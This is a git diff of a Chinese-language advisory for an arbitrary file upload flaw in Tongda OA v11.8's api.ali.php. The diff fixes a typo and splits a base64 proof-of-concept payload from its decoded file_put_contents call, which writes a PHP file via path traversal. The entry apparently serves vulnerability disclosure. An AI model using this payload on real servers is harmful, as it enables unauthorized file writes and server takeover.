@@ -2,7 +2,7 @@
 
 ## 漏洞描述
 
-通达OA v11.8 api.ali.php 存在任意文件上传漏洞，攻击者通过漏可以上传恶意文件控制服务器
+通达OA v11.8 api.ali.php 存在任意文件上传漏洞，攻击者通过漏洞可以上传恶意文件控制服务器
 
 ## 漏洞影响
 
@@ -37,7 +37,8 @@ Content-Type: application/octet-stream
 参数a base解码
 
 ```
-ZmlsZV9wdXRfY29udGVudHMoJy4uLy4uL2ZiNjc5MGY0LnBocCcsJzw/cGhwIHBocGluZm8oKTs/PicpOw==file_put_contents('../../fb6790f4.php','');
+ZmlsZV9wdXRfY29udGVudHMoJy4uLy4uL2ZiNjc5MGY0LnBocCcsJzw/cGhwIHBocGluZm8oKTs/PicpOw==
+file_put_contents('../../fb6790f4.php','');
 ```
 
 ![image-20220520154357492](./images/202205201543536.png)
